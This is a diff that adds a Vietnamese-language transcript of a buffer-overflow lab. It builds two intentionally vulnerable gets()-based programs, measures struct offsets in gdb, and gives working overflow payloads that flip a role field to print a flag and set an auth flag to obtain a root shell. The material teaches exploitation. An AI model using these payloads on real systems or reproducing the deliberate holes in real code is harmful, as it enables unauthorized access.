@@ -1,0 +1,79 @@
+=====================================================================
+Lab 3.1 - transcript (output THAT, chay tren server verify)
+Moi truong: Ubuntu 24.04.4 LTS, glibc 2.39, gcc 13.3.0
+ASLR: randomize_va_space = 2 (bat day du; bai nay No PIE nen khong anh huong)
+=====================================================================
+
+$ bash build.sh
+login.c: In function 'main':
+login.c:22:5: warning: implicit declaration of function 'gets'; did you mean 'fgets'?
+/usr/bin/ld: warning: the `gets' function is dangerous and should not be used.
+admin.c: In function 'main':
+admin.c:18:5: warning: implicit declaration of function 'gets'; did you mean 'fgets'?
+/usr/bin/ld: warning: the `gets' function is dangerous and should not be used.
+[*] built: login admin ; flag.txt created
+
+# gets() van link duoc tren glibc 2.39 (chi la warning), chay binh thuong.
+
+---------------------------------------------------------------------
+checksec (admin va login giong nhau)
+---------------------------------------------------------------------
+$ pwn checksec admin
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+    Debuginfo:  Yes
+
+---------------------------------------------------------------------
+Layout struct (xac minh bang gdb, ASLR off de dia chi on dinh)
+---------------------------------------------------------------------
+# admin: role nam ngay sau name[48]
+$ setarch -R gdb -q -batch -ex 'break admin.c:18' -ex run -ex 'p &u.name' -ex 'p &u.role' ./admin
+$1 = (char (*)[48]) 0x7fffffffe9e0
+$2 = (unsigned int *) 0x7fffffffea10      # cach dau name 0x30 = 48 byte
+
+# login: authed nam ngay sau buf[32]
+$ setarch -R gdb -q -batch -ex 'break login.c:22' -ex run -ex 'p &s.buf' -ex 'p &s.authed' ./login
+$1 = (char (*)[32]) 0x7fffffffe9f0
+$2 = (int *) 0x7fffffffea10               # cach dau buf 0x20 = 32 byte
+
+---------------------------------------------------------------------
+Thu bang tay (admin): 48 byte chua cham role, 48 + p32(0x80000001) in flag
+---------------------------------------------------------------------
+$ python3 -c "import sys;sys.stdout.buffer.write(b'A'*48+b'\n')" | ./admin
+Ten: role=0x0, ban chi la user.
+
+$ python3 -c "import sys;sys.stdout.buffer.write(b'A'*48+b'\x01\x00\x00\x80'+b'\n')" | ./admin
+Ten: Flag: FLAG{ban_da_ghi_de_bien_cuc_bo}
+
+---------------------------------------------------------------------
+Thu bang tay (login): 32 byte chua cham authed, 36 byte mo khoa
+---------------------------------------------------------------------
+$ python3 -c "import sys;sys.stdout.buffer.write(b'A'*32+b'\n')" | ./login
+Nhap ten dang nhap: authed hien tai = 0. Tu choi.
+
+$ python3 -c "import sys;sys.stdout.buffer.write(b'A'*36+b'\n')" | ./login
+Nhap ten dang nhap: [+] authed != 0, mo khoa thanh cong!
+
+---------------------------------------------------------------------
+exploit.py (lab: admin -> in flag, ghi 0x80000001 vao role tai offset 48)
+---------------------------------------------------------------------
+$ python3 exploit.py
+[+] Starting local process './admin': pid ...
+[*] Process './admin' stopped with exit code 0
+Flag: FLAG{ban_da_ghi_de_bien_cuc_bo}
+
+---------------------------------------------------------------------
+exp_login.py (demo: login -> shell, ghi 4 byte != 0 vao authed tai offset 32)
+---------------------------------------------------------------------
+$ python3 exp_login.py
+[+] Starting local process './login': pid ...
+[+] authed != 0, mo khoa thanh cong!
+===SHELL_OK===
+uid=0(root) gid=0(root) groups=0(root)
+
+# KET QUA: admin in flag, login lay shell. Offset do bang layout struct
+# (offsetof), khong doan: name->role = 48, buf->authed = 32.
